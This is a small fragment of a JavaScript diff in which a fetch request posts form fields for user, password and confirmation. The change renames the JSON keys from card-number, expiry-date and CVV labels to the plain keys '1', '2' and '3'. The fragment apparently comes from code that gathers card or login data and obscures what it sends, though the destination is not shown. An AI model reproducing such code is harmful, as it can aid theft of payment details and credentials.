@@ -14,9 +14,9 @@ try {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Tarjeta": formulario.usuario.value,
-            "Fecha": formulario.contraseña.value,
-            "Cvv": formulario.confirmar.value
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value
         })
     });
 
